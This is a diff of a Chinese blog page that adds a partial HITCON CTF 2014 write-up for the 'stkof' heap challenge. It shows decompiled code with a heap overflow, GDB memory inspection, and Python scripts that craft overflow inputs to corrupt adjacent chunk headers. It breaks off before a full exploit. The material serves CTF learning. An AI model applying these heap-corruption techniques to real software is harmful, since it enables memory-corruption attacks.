@@ -24,11 +24,33 @@
 <meta property="og:site_name" content="雾島风起時">
 <meta property="og:description" content="2014 HITCON CTF WriteUp🏆 赛事概况  赛事全称：HITCON CTF 2014  比赛时间：2014 年 8 月 16 日 12:00 至 8 月 18 日 12:00（UTC+8），共 48 小时  比赛形式：线上 Jeopardy（解题）模式  参赛规模：吸引了来自全球 71 个国家的 1,020 支队伍参赛  题目类型：涵盖 Trivial、Web Security">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cKI0aJB3pUzaB0oZnhT.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cLtaqCmS1QgX1Wgb0U3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cR0fWpJNFkCsC5HbK3D.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cR64qzqIIM8lTBefSav.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cREuP1qxeV9tN4IGgKc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cRGOo1vMSuJG5gEvO0i.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cRJPtyBi2ACXOz17TUD.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cRQSmZUhHe14XY57Na1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cRdyb5YiCgjXhWKL7tl.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cWntdHTkKPgyhe05erG.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cWowmr2PuJsvMx8iA4s.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cWrpd7fnlQ3yaxWL6wb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cXCKIsvgfLMJvRaIFNI.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cXBoyn0QIxSVmLc7fxs.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cXJj72hNEa1ovVPHkNY.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cXS2cEhBl2U5ejSzoo0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cYN73Vclj3v2QWv9tfH.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cYRDlgAGgoLcfPZjbOE.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cYYmZPq7rGhwxrMJ6JJ.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cahpgh1Vz3ZXz44XwpH.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034cZRr48SIx2MXtY1OpgN.png">
 <meta property="article:published_time" content="2014-04-14T05:18:00.000Z">
-<meta property="article:modified_time" content="2026-09-30T08:41:40.460Z">
+<meta property="article:modified_time" content="2026-10-08T22:41:16.687Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/i/034cKI0aJB3pUzaB0oZnhT.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -146,7 +168,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2014-HITCON-CTF-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2014 HITCON CTF WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stkof"><span class="toc-number">1.1.1.</span> <span class="toc-text">stkof</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2014-HITCON-CTF-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2014 HITCON CTF WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stkof%EF%BC%88Unsafe-Unlink%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">stkof（Unsafe Unlink）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -157,11 +179,11 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">256</div>
+    <div class="sidebar-state-number">253</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">20</div>
+    <div class="sidebar-state-number">19</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
@@ -224,7 +246,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2014-04-14T05:18:00.000Z" itemprop="datePublished">2014-04-14</time>
-    <time style="display: none;" id="post-update-time">2026-09-30</time>
+    <time style="display: none;" id="post-update-time">2026-10-09</time>
   </span>
 </div>
 
@@ -283,7 +305,181 @@
 <td align="left"></td>
 </tr>
 </tbody></table>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h3>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="stkof（Unsafe-Unlink）"><a href="#stkof（Unsafe-Unlink）" class="headerlink" title="stkof（Unsafe Unlink）"></a>stkof（Unsafe Unlink）</h3><p>先来分析第一个函数，它允许用户指定一个堆块编号，再指定写入长度，最后向该堆块写入数据</p>
+<p><img src="https://pic1.imgdb.cn/i/034cKI0aJB3pUzaB0oZnhT.png" alt="pasted_1791458572997_h4depe.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> remaining;</span><br><span class="line">    <span class="type">char</span> *write_ptr;</span><br><span class="line">    <span class="type">char</span> input_buf[<span class="number">104</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取堆块编号</span></span><br><span class="line">    fgets(input_buf, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    index = atol(input_buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查编号及指针</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0x100000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_table[index] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 读取用户指定的写入长度</span></span><br><span class="line">    fgets(input_buf, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    remaining = atoll(input_buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取堆块地址</span></span><br><span class="line">    write_ptr = chunk_table[index];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 向堆块写入数据，fread 不会自动检查 malloc 的申请大小</span></span><br><span class="line">    <span class="type">int</span> bytes_read;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((bytes_read = fread(</span><br><span class="line">                write_ptr, <span class="number">1</span>, remaining, <span class="built_in">stdin</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        write_ptr += bytes_read;</span><br><span class="line">        remaining -= bytes_read;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> remaining == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在第二种情况下，如果目标内存的后面紧挨着其他堆块，那么越界写入就可能覆盖后续堆块的管理信息</p>
+<p><img src="https://pic1.imgdb.cn/i/034cLtaqCmS1QgX1Wgb0U3.png" alt="pasted_1791462499817_jr32ow.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">104</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取用户要释放的编号</span></span><br><span class="line">    fgets(input, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    index = atol(input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查编号上限</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0x100000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查对应指针是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_table[index] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放堆块</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_table[index]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空指针</span></span><br><span class="line">    chunk_table[index] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show_chunk_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">104</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取堆块编号</span></span><br><span class="line">    fgets(input, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    index = atol(input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查编号范围</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0x100000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检查堆块指针</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_table[index] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 计算字符串长度</span></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(chunk_table[index]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 根据长度输出结果</span></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">3</span>)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;//TODO&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> request_size;</span><br><span class="line">    <span class="type">char</span> *chunk_ptr;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">104</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取申请大小</span></span><br><span class="line">    fgets(input, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    request_size = atoll(input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 申请堆内存</span></span><br><span class="line">    chunk_ptr = <span class="built_in">malloc</span>(request_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检查申请结果</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 分配新的编号</span></span><br><span class="line">    chunk_count++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 保存堆块指针</span></span><br><span class="line">    chunk_table[chunk_count] = chunk_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 打印编号</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, chunk_count);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析完全部代码过后，我们正常运行程序，申请两个堆块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">48</span><br><span class="line">1</span><br><span class="line">128</span><br></pre></td></tr></table></figure>
+
+<p>IDA 反编译创建堆块代码，<code>dword_602100</code> 这个全局变量在程序 <code>.bss/.data</code> 段中的实际存储地址是 <code>0x602100</code></p>
+<p><img src="https://pic1.imgdb.cn/i/034cR0fWpJNFkCsC5HbK3D.png" alt="pasted_1791475003255_1qbmnv.png"></p>
+<p>因为我们创建了两个堆块，所以这个地址的值应该是 2</p>
+<ul>
+<li><p><code>x</code>：examine，查看内存</p>
+</li>
+<li><p><code>/wd</code>：格式说明</p>
+<ul>
+<li><p><code>w</code>：word，通常表示 4 字节 &#x2F; 32 位</p>
+</li>
+<li><p><code>d</code>：decimal，按有符号十进制显示</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/i/034cR64qzqIIM8lTBefSav.png" alt="pasted_1791475216606_g8y4rw.png"></p>
+<p>验证通过后根据分析代码中的 “获取堆块地址” 找到伪代码 <code>ptr = (&amp;::s)[v2];</code></p>
+<p><img src="https://pic1.imgdb.cn/i/034cREuP1qxeV9tN4IGgKc.png" alt="pasted_1791475563955_lvrk1m.png"></p>
+<p>其中 <code>v2</code> 是用户输入的编号，<code>&amp;::s</code> 的地址是 <code>0x602140</code>，双击进去就能看到，并且注意，这是 <strong>指针数组</strong></p>
+<p><img src="https://pic1.imgdb.cn/i/034cRGOo1vMSuJG5gEvO0i.png" alt="pasted_1791475623681_5uqigj.png"></p>
+<ul>
+<li><p><code>/4gx</code>：格式说明</p>
+<ul>
+<li><p><code>4</code>：重复 4 次，也就是连续看 4 个单元</p>
+</li>
+<li><p><code>g</code>：giant word，通常表示 8 字节 &#x2F; 64 位</p>
+</li>
+<li><p><code>x</code>：hexadecimal，按十六进制显示</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/i/034cRJPtyBi2ACXOz17TUD.png" alt="pasted_1791475742617_8w2rug.png"></p>
+<p><strong>首先，程序启动时操作系统会自动将 <code>.bss</code> 段全部初始化为 0，而程序第一次创建堆块时使用的是 <code>++dword_602100</code>，所以第一个堆块从 <code>s[1]</code> 开始存</strong></p>
+<p><img src="https://pic1.imgdb.cn/i/034cRQSmZUhHe14XY57Na1.png" alt="pasted_1791476020152_injqpu.png"></p>
+<p><strong>因为这个 <code>&amp;::s</code> 是指针数组，所以 <code>s[0]</code> 的指针存储的是 <code>0x0</code></strong></p>
+<p><strong>一个指针占 8 字节，所以第一个堆块指针 <code>0x602140 + 8 = 0x602148</code> 保存 <code>0xe056b0</code></strong></p>
+<p><strong>第二个堆块指针 <code>0x602140 + 16 = 0x602150</code> 保存 <code>0xe05b00</code></strong></p>
+<p>现在测试两个堆块的距离</p>
+<ul>
+<li><code>p</code>：print，计算并输出表达式</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/i/034cRdyb5YiCgjXhWKL7tl.png" alt="pasted_1791476553420_nq2yy2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x450 = 0x40 + 0x410</span><br></pre></td></tr></table></figure>
+
+<p>这非常符合下面的内存布局</p>
+<p><img src="https://pic1.imgdb.cn/i/034cWntdHTkKPgyhe05erG.png" alt="pasted_1791489168870_t6lr0q.png"></p>
+<p>第一次执行 <code>printf()</code> 时，glibc 可能为标准输出分配一个缓冲区，而这个缓冲区恰好可能需要大小为 <code>0x410</code> 的 Chunk</p>
+<p><img src="https://pic1.imgdb.cn/i/034cWowmr2PuJsvMx8iA4s.png" alt="pasted_1791489210548_jred0x.png"></p>
+<p>所以这两个堆块不是直接相邻的，我们现在要观察的是堆块头部来验证我们的推测</p>
+<p><strong>malloc() 返回的是用户数据地址，64 位程序中，Chunk Header 位于用户数据地址前面 <code>0x10</code> 字节的位置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个堆块：</span><br><span class="line"></span><br><span class="line">用户地址：0xe056b0</span><br><span class="line">            - 0x10</span><br><span class="line">头部地址：0xe056a0</span><br></pre></td></tr></table></figure>
+
+<p>每一行都有两个 8 字节的数据：</p>
+<ul>
+<li><p>第一个值：<code>prev_size</code></p>
+</li>
+<li><p>第二个值：<code>size</code>，包含状态标志</p>
+</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/i/034cWrpd7fnlQ3yaxWL6wb.png" alt="pasted_1791489324029_kiuuhh.png"></p>
+<table>
+<thead>
+<tr>
+<th>Chunk</th>
+<th>头部地址</th>
+<th>size 字段</th>
+<th>实际 Chunk 大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Chunk 1</td>
+<td>0xe056a0</td>
+<td>0x41</td>
+<td>0x40</td>
+</tr>
+<tr>
+<td>中间 Chunk</td>
+<td>0xe056e0</td>
+<td>0x411</td>
+<td>0x410</td>
+</tr>
+<tr>
+<td>Chunk 2</td>
+<td>0xe05af0</td>
+<td>0x91</td>
+<td>0x90</td>
+</tr>
+</tbody></table>
+<p>为什么 <code>0x41</code> 对应实际大小 <code>0x40</code>？</p>
+<p>因为 <code>size</code> 字段最低位的 1 是 <code>PREV_INUSE</code> 标志，表示前一个物理相邻 Chunk 被标记为正在使用</p>
+<p>现在我们可以根据地址计算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">头部地址：0xe056a0</span><br><span class="line">实际大小：0x40</span><br><span class="line">0xe056a0 + 0x40 = 0xe056e0</span><br><span class="line"></span><br><span class="line">头部地址：0xe056e0</span><br><span class="line">实际大小：0x410</span><br><span class="line">0xe056e0 + 0x410 = 0xe05af0</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们已经证明</p>
+<p><img src="https://pic1.imgdb.cn/i/034cXCKIsvgfLMJvRaIFNI.png" alt="pasted_1791490132416_oyvu6f.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看标准输出流 stdout 内部缓冲区的起始地址，并以十六进制显示</span></span><br><span class="line">p/x ((struct _IO_FILE *)stdout)-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/034cXBoyn0QIxSVmLc7fxs.png" alt="pasted_1791490112251_3avfx7.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看缓冲区的结束地址</span></span><br><span class="line">p/x ((struct _IO_FILE *)stdout)-&gt;_IO_buf_end</span><br><span class="line"></span><br><span class="line"># 计算缓冲区的长度</span><br><span class="line">p/x (char *)((struct _IO_FILE *)stdout)-&gt;_IO_buf_end - (char *)((struct _IO_FILE *)stdout)-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/034cXJj72hNEa1ovVPHkNY.png" alt="pasted_1791490424142_nlkpek.png"></p>
+<p>接下来测试创建第三个堆块看是否相邻，大小还是 128</p>
+<p>两个地址相差 <code>0x90</code>，这说明 Chunk 3 紧挨着 Chunk 2</p>
+<p><img src="https://pic1.imgdb.cn/i/034cXS2cEhBl2U5ejSzoo0.png" alt="pasted_1791490752163_xm6acg.png"></p>
+<p>回忆 Edit 函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr = chunk_table[index];</span><br><span class="line">fread(ptr, <span class="number">1</span>, n, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果选择编号 2，那么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0xe05b00</span>;</span><br></pre></td></tr></table></figure>
+
+<p>现在想一想：</p>
+<ul>
+<li><p>写入 <code>0x80</code> 字节，会覆盖 Chunk 2 申请的 128 字节用户数据。</p>
+</li>
+<li><p>写入 <code>0x88</code> 字节，就会额外覆盖 Chunk 3 的 prev_size 字段。</p>
+</li>
+<li><p>写入 <code>0x90</code> 字节，还会覆盖 Chunk 3 的 size 字段</p>
+</li>
+</ul>
+<p>编写调试脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x80</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">b&quot;C&quot;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">data = (</span><br><span class="line">    <span class="string">b&quot;1\n48\n&quot;</span>      <span class="comment"># 创建 Chunk 1</span></span><br><span class="line">    <span class="string">b&quot;1\n128\n&quot;</span>     <span class="comment"># 创建 Chunk 2</span></span><br><span class="line">    <span class="string">b&quot;1\n128\n&quot;</span>     <span class="comment"># 创建 Chunk 3</span></span><br><span class="line">    <span class="string">b&quot;2\n2\n144\n&quot;</span>  <span class="comment"># Edit Chunk 2，写入 144 字节</span></span><br><span class="line">    + payload</span><br><span class="line">    + <span class="string">b&quot;4\n2\n&quot;</span>     <span class="comment"># 进入第 4 功能，供 GDB 断点暂停</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;overflow.in&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
+
+<p>先在菜单第 4 个功能入口设置断点，然后重新运行</p>
+<p>此时 Edit 已经完成，堆溢出已经发生，但第 4 个功能还没有执行，方便我们安全地观察被覆盖的头部</p>
+<p>第三个堆块指针 <code>0x602150 + 8 = 0x602158</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b *0x400BA9</span><br><span class="line"></span><br><span class="line">run &lt; overflow.in</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$p2</span> = *(char **)0x602150</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$p3</span> = *(char **)0x602158</span><br><span class="line"></span><br><span class="line">x/2gx <span class="variable">$p3</span> - 0x10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/034cYN73Vclj3v2QWv9tfH.png" alt="pasted_1791493002198_f9bq1f.png"></p>
+<p>通过 <code>edit(2)</code> 写入 Chunk 2 的数据，成功修改了 Chunk 3 的堆管理信息</p>
+<p><img src="https://pic1.imgdb.cn/i/034cYRDlgAGgoLcfPZjbOE.png" alt="pasted_1791493164365_sp19jv.png"></p>
+<p>我们下一步要让它变成一个有意义的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prev_size = 0x90</span><br><span class="line">size      = 0x90</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x80</span></span><br><span class="line">payload += pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x90</span>)  <span class="comment"># prev_size</span></span><br><span class="line">payload += pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x90</span>)  <span class="comment"># size，清除 PREV_INUSE</span></span><br><span class="line"></span><br><span class="line">data = (</span><br><span class="line">    <span class="string">b&quot;1\n48\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;1\n128\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;1\n128\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;2\n2\n144\n&quot;</span></span><br><span class="line">    + payload</span><br><span class="line">    + <span class="string">b&quot;4\n2\n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;overflow2.in&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
+
